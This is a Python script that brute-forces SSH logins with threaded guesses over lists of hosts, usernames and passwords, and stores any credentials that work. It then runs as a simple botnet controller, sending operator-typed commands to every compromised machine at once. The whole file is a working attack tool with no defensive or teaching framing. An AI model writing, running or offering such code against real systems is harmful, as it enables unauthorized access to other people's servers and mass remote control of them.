from pexpect import pxssh
import threading
import os
import sys

password_found = False

class Client :
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            sessions.append(s)
            print("[+] Client connected: " + self.host)

        except Exception as e:
            print(e)
            print("[-] Error Connecting")

sessions: list[pxssh.pxssh] = []

def botnet():
    if not os.path.exists("./clients"):
        print("[-] Clients folder not found")
        print("[-] Use --pw-break to create clients folder")
        return

    if len(os.listdir("./clients")) == 0:
        print("[-] No clients found")
        return

    print("[+] Clients found: " + str(len(os.listdir("./clients"))))

    for file in os.listdir("./clients"):
        client_file = open("./clients/" + file, 'r')
        lines = client_file.readlines()
        host = lines[0].strip('\r').strip('\n')
        user = lines[1].strip('\r').strip('\n')
        password = lines[2].strip('\r').strip('\n')

        session = Client(host, user, password)

    if len(sessions) == 0:
        print("[-] No clients connected")
        return

    print("[+] Clients connected: " + str(len(sessions)) + "\n")

    while True:
        command = input("Enter command: ")
        if command == "exit":
            break

        for session in sessions:
            print("[+] Sending command: " + command)
            session.sendline(command)
            session.prompt()
            print(session.before.decode('utf-8'))

            
def connect(host, user, password):
    global password_found

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Client connected!')
        password_found = True
        file = open("./clients/" + user + ".txt", "w")
        try:
            file.write(f"{host}\n{user}\n{password}")
        except Exception as e:
            print(e)

    except Exception as e:
        print(e)

def pw_breaker():
    hosts_file = open("hosts.txt", 'r')
    users_file = open("users.txt", 'r')
    passwords_file = open("senhas.txt", 'r')

    if not os.path.exists("./clients"):
        os.mkdir("./clients")

    hosts = []
    users = []
    passwords = []

    for line in hosts_file.readlines():
        hosts.append(line.strip('\r').strip('\n'))

    for line in users_file.readlines():
        users.append(line.strip('\r').strip('\n'))

    for line in passwords_file.readlines():
        passwords.append(line.strip('\r').strip('\n'))

    for host in hosts:
        print(host)
        for user in users:
            print("\t" + user)
            for password in passwords:
                if password_found:
                    break

                t = threading.Thread(target=connect, args=(host,user,password))
                t.start()

    # if all threads are done, exit
    while threading.active_count() > 1:
        pass
    
def start():
    # menu de opções
    # 1 - quebrar senhas
    # 2 - executar comandos em clientes


    option = ""

    while option != "exit":
        option = ""
        print("\n===============================")
        print("1 - Break passwords")
        print("2 - Execute commands on clients")
        print("exit - Exit")

        option = input("\n> ")

        if option == "1":
            pw_breaker()
            continue
        elif option == "2":
            botnet()
            continue
        elif option == "exit":
            break
        else:
            print("\n[-] Invalid option\n")
           
            
if __name__ == '__main__':
    
    start()
